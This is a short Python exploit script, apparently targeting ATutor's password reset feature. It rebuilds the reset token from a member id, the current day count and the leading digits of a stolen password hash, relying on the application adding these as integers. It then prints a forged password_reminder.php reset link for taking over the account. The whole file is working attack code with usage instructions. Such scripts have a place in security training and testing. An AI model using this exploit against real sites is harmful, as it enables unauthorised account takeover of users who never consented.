import hashlib, string, itertools, re, sys, requests, time

if len(sys.argv) != 4:
    print ('(+) usage: %s <id> <atutor_ip> <hash>' % sys.argv[0])
    print ('(+) eg: %s 1 192.168.1.2 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e'  % sys.argv[0])
    sys.exit(-1)

id = sys.argv[1]
ip = sys.argv[2]
pw = sys.argv[3]

pw_int = re.findall(r'\d+', pw)
epoch_time = str(int(time.time()/60/60/24))

## $hash = sha1($row['member_id'] + $gen + $row['password']);
## $hash_bit = substr($hash, 5, 15);
# The pw hash can be brute since it is treated as int
# 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e -> 8635
hash = int(id) + int(epoch_time) + int(pw_int[0])

hash_bit = hashlib.sha1(str(hash)).hexdigest()[5:20]
url = "http://%s/ATutor/password_reminder.php?id=%s&g=%s&h=%s" % (ip, id, epoch_time, hash_bit)

print ("(+) The reset password link is: %s" % (url))